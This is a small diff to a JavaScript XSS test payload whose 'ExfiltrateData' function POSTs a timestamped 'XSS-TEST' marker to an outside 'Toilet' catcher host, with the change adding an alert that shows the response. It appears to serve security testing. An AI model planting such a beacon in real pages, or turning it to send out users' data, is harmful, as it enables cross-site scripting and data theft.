@@ -18,11 +18,17 @@ var TimeAsMS        = CurrDT.getTime();
 
 //Send Request to Toilet - Thirdparty POST catcher. 
 function ExfiltrateData(ID)
-{	
-	 const xhr = new XMLHttpRequest();
-	 xhr.open("POST", Toilet+"/post", true);
-	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	 xhr.send("XSS-TEST-"+ID);	
+{
+	var Response = "";
+	 var xhr = new XMLHttpRequest();
+	 xhr.onreadystatechange = function() {
+			if (xhr.readyState == XMLHttpRequest.DONE) {
+				 alert(xhr.responseText);
+			}
+		}
+		 xhr.open('POST', Toilet+"/post", true);
+		 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		 xhr.send("XSS-TEST-"+ID);		 
 }
 
 ExfiltrateData(TimeAsMS);
